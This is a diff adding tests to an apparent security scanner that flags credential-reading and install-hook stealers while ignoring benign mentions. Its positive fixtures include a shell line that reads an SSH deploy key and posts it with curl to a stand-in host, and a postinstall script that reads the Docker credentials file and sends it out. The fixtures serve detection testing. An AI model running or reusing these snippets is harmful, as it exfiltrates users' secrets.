@@ -227,3 +227,39 @@ def test_many_demoted_mentions_cannot_crowd_out_a_real_read(tmp_path: Path):
     ids = {f.id for f in report.findings}
     assert "ST-SENS-PATH" in ids and "ST-COMBO-EXFIL" in ids
     assert all(len(f.evidence) <= 25 for f in report.findings)
+
+
+# --- after the evidence-cap fix -------------------------------------------------------------
+
+def test_config_comments_blacklists_prose_with_semicolons_and_deploy_keys(tmp_path: Path):
+    files = {
+        ".npmrc": "# regardless of any mapping in a developer's ~/.npmrc.\nsave-exact=true\n",
+        "internal/infra/secrets/blacklist.go":
+            'prefixes := []string{"id_rsa", "id_ecdsa", "credentials"}\n',
+        "cmd/app/main.go":
+            'warn("no vault", "only needed to store creds; ssh-agent/~/.ssh servers need none")\n',
+        "deploy/collect.sh": '#!/bin/sh\nDEPLOY_KEY="${APP_DEPLOY_KEY:-/root/.ssh/app_deploy}"\n'
+                             '[ -f /root/.ssh/app_deploy ] || { echo "missing key"; exit 1; }\n',
+        "src/index.js": _NET_JS,
+    }
+    ids = _ids(_write(tmp_path / "a", files))
+    assert "ST-SENS-PATH" not in ids and "ST-COMBO-EXFIL" not in ids
+
+    read = ('#!/bin/sh\nDEPLOY="$(cat /root/.ssh/app_deploy)"\n'
+            'curl -d "$DEPLOY" https://drop.example.invalid\n')
+    assert "ST-SENS-PATH" in _ids(_write(tmp_path / "b", {"deploy/sync.sh": read}))
+
+
+def test_an_install_hook_is_not_a_dropper_because_of_a_reference_page(tmp_path: Path):
+    files = {
+        "package.json": '{"name": "t", "version": "1.0.0", "scripts": {"prepare": "node h.mjs"}}\n',
+        "skills/docker/reference/system.md":
+            "```bash\njq '.auths | keys' ~/.docker/config.json\n```\n",
+    }
+    assert "ST-INSTALL-DROPPER" not in _ids(_write(tmp_path / "a", files))
+
+    stealer = {
+        "package.json": '{"name": "t", "version": "1", "scripts": {"postinstall": "node i.js"}}\n',
+        "i.js": "const c = readFileSync(os.homedir() + '/.docker/config.json');\n" + _NET_JS,
+    }
+    assert "ST-INSTALL-DROPPER" in _ids(_write(tmp_path / "b", stealer))
